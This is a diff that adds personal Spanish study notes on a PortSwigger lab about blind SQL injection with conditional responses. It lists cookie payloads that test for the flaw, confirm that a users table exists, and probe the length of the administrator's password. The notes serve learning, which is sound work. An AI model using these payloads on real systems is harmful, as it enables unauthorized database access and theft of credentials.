@@ -132,6 +132,37 @@ https://0a1100510486b06c81d116f4001a0046.web-security-academy.net/filter?categor
 
 
 
+
+
+ ####  #### Blind SQL injection with conditional responses ####  #### 
+
+Este es un tipo de inyeccion a ciegas porque no ves el error que te da. En PortSwigger te avisan del parametro TrachingId que es vulnerable y un mensaje de "Welcome Back!"
+en la web (que supongo que será la ID de la sesión iniciada en la web)
+
+Cuando la cookie esta:
+
+TrackingId=q8JZjDAPSH5UYtS9 --> aparece welcome back
+TrackingId=q8JZjDAPSH5UYtS9' --> no aparece welcome back
+TrackingId=q8JZjDAPSH5UYtS9'-- - --> aparece welcome back
+TrackingId=q8JZjDAPSH5UYtS9' AND 1=1-- - --> aparece welcome back
+TrackingId=q8JZjDAPSH5UYtS9' AND 2=1-- - --> NO aparece welcome back
+
+TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users limit 1) = 'a'-- -   --> aparece welcome back
+
+
+>> Comprobar que existe una tabla
+TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from dusers limit 1) = 'a'-- - --> NO aparece welcome back
+TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users limit 1) = 'a'-- - --> aparece welcome back
+>> Averiguar longitud de la contraseña 
+TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users where username='administrator' and length(password)=20) = 'a'-- -
+
+
+
+
+
+
+
+
 https://www.youtube.com/watch?v=C-FiImhUviM
 
 
